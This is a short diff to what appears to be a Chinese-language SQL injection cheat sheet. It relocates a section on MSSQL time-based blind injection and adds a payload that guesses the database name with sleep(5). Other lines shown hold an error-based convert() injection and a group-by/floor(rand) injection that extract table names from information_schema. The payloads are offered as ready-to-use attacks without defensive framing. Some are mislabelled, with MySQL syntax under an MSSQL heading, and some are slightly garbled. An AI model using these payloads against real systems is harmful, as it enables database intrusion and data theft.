@@ -301,14 +301,6 @@ file_name(@@version)
 ```
 ' and 1=convert(int,(select top 1 table_name from information_schema.tables))--+
 ```
-#### mssql时间盲注
-
-- 获取database长度
-```
-'and(select*from(select+if(length(database())=6,sleep(5),1))a/**/union/**/select+1)='a
-
-```
-
 
 #### mssql_waf绕过
 
@@ -403,6 +395,14 @@ file_name(@@version)
 - 获取当前所有表
 ```
 1' and (select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)
+
+```
+#### mssql时间盲注
+
+- 获取database长度
+```
+'and(select*from(select+if(length(database())=6,sleep(5),1))a/**/union/**/select+1)='a
+'and(select*from(select+if(substr(database(),1,6)='master',sleep(5),1))a/**/union/**/select+1)='a
 
 ```
 
